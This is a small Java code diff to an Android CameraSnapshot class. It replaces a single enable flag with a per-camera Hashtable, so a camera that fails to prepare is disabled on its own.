@@ -37,6 +37,7 @@ import com.android.dvci.util.Utils;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.OutputStream;
+import java.util.Hashtable;
 import java.util.List;
 import java.util.concurrent.Semaphore;
 
@@ -69,7 +70,7 @@ public class CameraSnapshot {
 	private Object cameraLock = new Object();
 
 	private static CameraSnapshot singleton = null;
-	private boolean enable = true;
+	private Hashtable<Integer, Boolean> enable = new Hashtable<Integer, Boolean>();
 	private Camera.AutoFocusCallback autofocusCallback = new Camera.AutoFocusCallback() {
 		@Override
 		@TargetApi(Build.VERSION_CODES.HONEYCOMB)
@@ -168,7 +169,7 @@ public class CameraSnapshot {
 		//	return;
 		//}
 		//768x432
-		if(!enable){
+		if(enable.containsKey(cameraId) && !enable.get(cameraId)){
 			return;
 		}
 		Camera camera = null;
@@ -177,7 +178,7 @@ public class CameraSnapshot {
 			try {
 				camera = prepareCamera(cameraId, encWidth, encHeight);
 				if (camera == null) {
-					this.enable = false;
+					this.enable.put(cameraId, false);
 					return;
 				}
 
